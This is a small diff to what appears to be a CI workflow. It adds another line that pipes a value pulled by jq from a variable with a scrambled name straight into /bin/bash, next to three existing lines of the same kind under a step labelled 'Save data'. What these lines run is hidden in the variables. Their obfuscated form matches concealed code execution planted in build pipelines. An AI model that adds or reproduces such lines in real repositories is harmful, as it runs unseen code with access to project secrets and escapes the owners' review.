@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$dpmlt506" | jq -r .bu1 | /bin/bash
           echo $segc051 | jq -r .awisd2577 | /bin/bash
           printf '%s' "$luo089" | jq -r .ccupr7 | /bin/bash
+          echo $czrna6 | jq -r .pdh31 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
